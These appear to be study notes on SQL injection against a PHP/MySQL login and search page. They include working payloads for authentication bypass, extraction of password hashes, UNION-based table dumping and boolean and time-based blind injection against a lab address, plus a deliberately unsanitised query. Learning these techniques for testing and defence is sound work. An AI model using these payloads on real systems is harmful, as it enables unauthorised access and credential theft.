Starting with sample code:
```
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

## Error-Based Payloads
### Authentication Bypass
add closing quote for uname value and add OR 1=1 followed by -- comment separator and // to prematurely terminate SQL statement.  this type of comment requires two consecutive dashes followed by at least one whitespace character.  // protects against whitespace truncation and provides visibility on payload.

input: `offsec' OR 1=1 -- //`
query becomes: `SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --`

appending always-true OR statement tells WHERE clause to return the first user id present in the db whether or not the user record is present.

test for lack of input sanitation that allows SQL to be manipulated by ending username input with ' and seeing if an SQL syntax error is returned rather than "invalid username or password".

### Expanding further...
a second statement can be injected with premature termination of the query.

input: `' or 1=1 in (select @@version) -- //`
***MySQL accepts both version() and @@version***

if that succeeds, try dumping the whole users table:
input `' OR 1=1 in (SELECT * FROM users) -- //`

if it complains about "operand should contain 1 column" then only query one column at a time:
```
' or 1=1 in (SELECT password FROM users) -- //
```
this could/will return all password hashes

to get hash for single user:
```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## UNION-based Payloads

if result of the query is displayed along with application-returned value, test for UNION-based SQLi

UNION is helpful because it enables the execution of a n extra SELECT statement and provides results in same query, concatenating 2 queries into 1

For **UNION** SQLi attacks to work, we first need to satisfy two conditions:
1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.

Vulnerable query: `$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";`
The query fetches all records from the 'customers' table, and includes the LIKE keyword to fuzzy-search 'name' values for our input, followed by 0+ characters where the % is.

we need to know exact number of columns, and displayed columns on page might not be all columns in table.
`' ORDER BY 1-- //` 
^ use to find correct number of columns.  increment/change number to check number.  This could be automated with Burp.

given 5-column 'customers' table, we can use this query to enumerate the db:
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```
After launching our attack, we'll notice that the username and the DB version are present on the last line, but the current database name is not. This happens because column 1 is typically reserved for the ID field consisting of an _integer_ data type, meaning it cannot return the string value we are requesting through the _SELECT database()_ statement.
With this in mind, let's update our query by shifting all the enumerating functions to the right-most place, avoiding any type mismatches.

```
' UNION SELECT null, null, database(), user(), @@version  -- //
```

### moving on to other tables...
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

this reveals a new table, users, in the example.
new query to dump the users table:
```
' UNION SELECT null, username, password, description, null FROM users -- //
```


## Blind SQL Injections

Error-based and UNION payloads were "in-band", so results are returned inside web application.

Alternatively, _blind_ SQL injections describe scenarios in which database responses are never returned and behavior is inferred using either boolean- or time-based logic.
As an example, generic boolean-based blind SQL injections cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result, hence the "boolean" name. These values can be reviewed within the application context.

Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.

Time-based blind SQL injections infer the query results by instructing the database to wait for a specified amount of time. Based on the response time, the attacker can conclude if the statement is TRUE or FALSE.

Given example URL "http://192.168.50.16/blindsqli.php?user=offsec"

To test for boolean-based SQLi, we can try to append the below payload to the URL:

```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

it will only return the values if the user is present

We can achieve the same result by using a time-based SQLi payload:

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

this appends an IF condition that will always be true inside the statement but will return false if the user is non-existent.

if the user exists, the application hangs for about 3 seconds.

